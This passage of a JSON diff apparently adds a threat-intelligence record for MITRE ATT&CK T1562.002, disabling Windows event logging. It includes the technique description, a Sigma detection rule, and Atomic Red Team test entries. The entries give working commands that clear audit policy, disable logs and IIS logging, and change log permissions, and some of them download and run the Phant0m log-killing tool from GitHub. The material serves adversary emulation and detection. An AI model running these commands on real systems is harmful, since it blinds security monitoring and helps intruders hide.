<code>Stop-Service -Name EventLog</code>.(Citation: Disable_Win_Event_Logging) Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
+                            "mitre-cti:name": "Disable Windows Event Logging",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Prasanth Sadanala, Cigna Information Protection (CIP) - Threat Response Engineering Team'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a', 'type': 'attack-pattern', 'created': '2020-02-21T20:46:36.688Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1562.002', 'url': 'https://attack.mitre.org/techniques/T1562/002'}, {'source_name': 'Windows Log Events', 'url': 'https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/', 'description': 'Franklin Smith. (n.d.). Windows Security Log Events. Retrieved February 21, 2020.'}, {'source_name': 'EventLog_Core_Technologies', 'url': 'https://www.coretechnologies.com/blog/windows-services/eventlog/', 'description': 'Core Technologies. (2021, May 24). Essential Windows Services: EventLog / Windows Event Log. Retrieved September 14, 2021.'}, {'source_name': 'Audit_Policy_Microsoft', 'url': 'https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/audit-policy', 'description': 'Daniel Simpson. (2017, April 19). Audit Policy. Retrieved September 13, 2021.'}, {'source_name': 'Advanced_sec_audit_policy_settings', 'url': 'https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/advanced-security-audit-policy-settings', 'description': 'Simpson, D. et al. (2017, April 19). Advanced security audit policy settings. Retrieved September 14, 2021.'}, {'source_name': 'auditpol', 'url': 'https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/auditpol', 'description': 'Jason Gerend, et al. (2017, October 16). auditpol. Retrieved September 1, 2021.'}, {'source_name': 'Disable_Win_Event_Logging', 'url': 'https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1562-impair-defenses/disable-windows-event-logging', 'description': ' dmcxblue. (n.d.). Disable Windows Event Logging. Retrieved September 10, 2021.'}, {'source_name': 'auditpol.exe_STRONTIC', 'url': 'https://strontic.github.io/xcyclopedia/library/auditpol.exe-214E0EA1F7F7C27C82D23F183F9D23F1.html', 'description': 'STRONTIC. (n.d.). auditpol.exe. Retrieved September 9, 2021.'}, {'source_name': 'T1562.002_redcanaryco', 'url': 'https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md', 'description': 'redcanaryco. (2021, September 3). T1562.002 - Disable Windows Event Logging. Retrieved September 13, 2021.'}, {'source_name': 'def_ev_win_event_logging', 'url': 'https://www.hackingarticles.in/defense-evasion-windows-event-logging-t1562-002/', 'description': 'Chandel, R. (2021, April 22). Defense Evasion: Windows Event Logging (T1562.002). Retrieved September 14, 2021.'}, {'source_name': 'evt_log_tampering', 'url': 'https://svch0st.medium.com/event-log-tampering-part-1-disrupting-the-eventlog-service-8d4b7d67335c', 'description': 'svch0st. (2020, September 30). Event Log Tampering Part 1: Disrupting the EventLog Service. Retrieved September 14, 2021.'}], 'modified': '2021-10-19T13:37:30.534Z', 'name': 'Disable Windows Event Logging', 'description': 'Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\\n\\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\\\Local Policies\\\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\\n\\nAdversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line: <code>Stop-Service -Name EventLog</code>.(Citation: Disable_Win_Event_Logging) Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\\n\\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'defense-evasion'}], 'x_mitre_detection': 'Monitor processes and command-line arguments for commands that can be used to disable logging. For example, [Wevtutil](https://attack.mitre.org/software/S0645), `auditpol`, `sc stop EventLog`, and offensive tooling (such as [Mimikatz](https://attack.mitre.org/software/S0002) and `Invoke-Phant0m`) may be used to clear logs.(Citation: def_ev_win_event_logging)(Citation: evt_log_tampering)  \\n\\nIn Event Viewer, Event ID 1102 under the “Security” Windows Log and Event ID 104 under the “System” Windows Log both indicate logs have been cleared.(Citation: def_ev_win_event_logging) `Service Control Manager Event ID 7035` in Event Viewer may indicate the termination of the EventLog service.(Citation: evt_log_tampering) Additionally, gaps in the logs, e.g. non-sequential Event Record IDs, may indicate that the logs may have been tampered.\\n\\nMonitor the addition of the MiniNT registry key in `HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control`, which may disable Event Viewer.(Citation: def_ev_win_event_logging)', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.1', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Command: Command Execution', 'Sensor Health: Host Status', 'Application Log: Application Log Content', 'Script: Script Execution', 'Process: Process Creation', 'Windows Registry: Windows Registry Key Creation'], 'x_mitre_defense_bypassed': ['Log analysis'], 'x_mitre_permissions_required': ['Administrator']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "65236ec7-ace0-4f0c-82fd-737b04fd4dcb",
+                        "lookup_data": {
+                            "description": "Detects the creation of new files with the \".evtx\" extension in non-common locations. Which could indicate tampering with default evtx locations in order to evade security controls",
+                            "raw": "author: D3F7A5105\ndate: 2023/01/02\ndescription: Detects the creation of new files with the \".evtx\" extension in non-common\n  locations. Which could indicate tampering with default evtx locations in order to\n  evade security controls\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_baseimage:\n    TargetFilename|endswith: \\Windows\\System32\\winevt\\Logs\\\n    TargetFilename|startswith: C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\\n  filter_img:\n    Image:\n    - C:\\Windows\\explorer.exe\n    - C:\\Windows\\system32\\dllhost.exe\n  filter_path:\n    TargetFilename|startswith: C:\\Windows\\System32\\winevt\\Logs\\\n  selection:\n    TargetFilename|endswith: .evtx\nfalsepositives:\n- Admin activity\n- Backup activity\nid: 65236ec7-ace0-4f0c-82fd-737b04fd4dcb\nlevel: medium\nlogsource:\n  category: file_event\n  definition: 'Requirements: The \".evtx\" exntesion should be monitored via a Sysmon\n    configuration. Example: <TargetFilename condition=\"end with\">.evtx<TargetFilename>'\n  product: windows\nreferences:\n- https://learn.microsoft.com/en-us/windows/win32/eventlog/eventlog-key\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1562.002\ntitle: EVTX Created In Uncommon Location\n",
+                            "sigma:id": "65236ec7-ace0-4f0c-82fd-737b04fd4dcb",
+                            "title": "EVTX Created In Uncommon Location",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1562.002",
+                "display_name": "Impair Defenses: Disable Windows Event Logging",
+                "atomic_tests": [
+                    {
+                        "name": "Disable Windows IIS HTTP Logging",
+                        "auto_generated_guid": "69435dcf-c66f-4ec0-a8b1-82beb76b34db",
+                        "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "website_name": {
+                                "description": "The name of the website on a server",
+                                "type": "string",
+                                "default": "Default Web Site"
+                            }
+                        },
+                        "executor": {
+                            "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n",
+                            "cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Disable Windows IIS HTTP Logging via PowerShell",
+                        "auto_generated_guid": "a957fb0f-1e85-49b2-a211-413366784b1e",
+                        "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "website_name": {
+                                "description": "The name of the website on a server",
+                                "type": "string",
+                                "default": "Default Web Site"
+                            }
+                        },
+                        "executor": {
+                            "command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\#{website_name}\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true\n",
+                            "cleanup_command": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){\n  C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false *>$null\n}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Kill Event Log Service Threads",
+                        "auto_generated_guid": "41ac52ba-5d5e-40c0-b267-573ed90489bd",
+                        "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n",
+                            "cleanup_command": "Write-Host \"NEED TO Restart-Computer TO ENSURE LOGGING RETURNS\" -fore red\nRemove-Item \"$env:TEMP\\Invoke-Phant0m.ps1\" -ErrorAction Ignore\n",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Impair Windows Audit Log Policy",
+                        "auto_generated_guid": "5102a3a7-e2d7-4129-9e45-f483f2e0eea8",
+                        "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable\n",
+                            "cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Clear Windows Audit Policy Config",
+                        "auto_generated_guid": "913c0e4e-4b37-4b78-ad0b-90e7b25010f6",
+                        "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "auditpol /clear /y\nauditpol /remove /allusers\n",
+                            "cleanup_command": "auditpol /set /category:\"Account Logon\" /success:enable /failure:enable\nauditpol /set /category:\"Detailed Tracking\" /success:enable\nauditpol /set /category:\"Logon/Logoff\" /success:enable /failure:enable\n",
+                            "name": "command_prompt",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Disable Event Logging with wevtutil",
+                        "auto_generated_guid": "b26a3340-dad7-4360-9176-706269c74103",
+                        "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "log_name": {
+                                "description": "Name of the log to be disabled",
+                                "type": "string",
+                                "default": "Microsoft-Windows-IKE/Operational"
+                            }
+                        },
+                        "executor": {
+                            "command": "wevtutil sl \"#{log_name}\" /e:false\n",
+                            "cleanup_command": "wevtutil sl \"#{log_name}\" /e:true\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Makes Eventlog blind with Phant0m",
+                        "auto_generated_guid": "3ddf3d03-f5d6-462a-ad76-2c5ff7b6d741",
+                        "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "file_name": {
+                                "description": "exe version of Phant0m",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "Phant0m.exe must exist on disk at specified location (#{file_name})\n",
+                                "prereq_command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1562.002/bin/Phant0m.exe\" -OutFile \"#{file_name}\" -UseBasicParsing\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "\"#{file_name}\"\n",
+                            "cleanup_command": "echo \"Sorry you have to reboot\"\n",
+                            "name": "command_prompt"
+                        }
+                    },
+                    {
+                        "name": "Modify Event Log Channel Access Permissions via Registry - PowerShell",
+                        "auto_generated_guid": "8e81d090-0cd6-4d46-863c-eec11311298f",
+                        "description": "This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the \"ChannelAccess\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "ChannelPath": {
+                                "type": "string",
+                                "default": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-TaskScheduler/Operational",
+                                "description": "Path to the event log service channel to alter"
+                            }
+                        },
+                        "executor": {
+                            "command": "Set-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore ",
+                            "cleanup_command": "Set-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Modify Event Log Channel Access Permissions via Registry 2 - PowerShell",
+                        "auto_generated_guid": "85e6eff8-3ed4-4e03-ae50-aa6a404898a5",
+                        "description": "This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the \"ChannelAccess\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "ChannelPath": {
+                                "type": "string",
+                                "default": "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\Setup",
+                                "description": "Path to the event log service channel to alter"
+                            }
+                        },
+                        "executor": {
+                            "command": "New-Item -Path #{ChannelPath} -Force\nSet-ItemProperty -Path #{ChannelPath} -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore",
+                            "cleanup_command": "Remove-Item -Path #{ChannelPath} -Force\nRestart-Service -Name EventLog -Force -ErrorAction Ignore",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    },
+                    {
+                        "name": "Modify Event Log Access Permissions via Registry - PowerShell",
+                        "auto_generated_guid": "a0cb81f8-44d0-4ac4-a8f3-c5c7f43a12c1",
+                        "description": "This test simulates an adversary modifying access permissions for a Windows Event Log channel by setting the \"CustomSD\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "CustomSDPath": {
+                                "type": "string",
+                                "default": "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\System",
+                                "description": "Path to the event log service channel to alter"
+                            }
+                        },
+                        "executor": {
+                            "command": "Set-ItemProperty -Path #{CustomSDPath} -Name \"CustomSD\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"",
+                            "cleanup_command": "Remove-ItemProperty -Path #{CustomSDPath} -Name \"CustomSD\"",
+                            "name": "powershell",
+                            "elevation_required": true
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 16:41:56"
+}
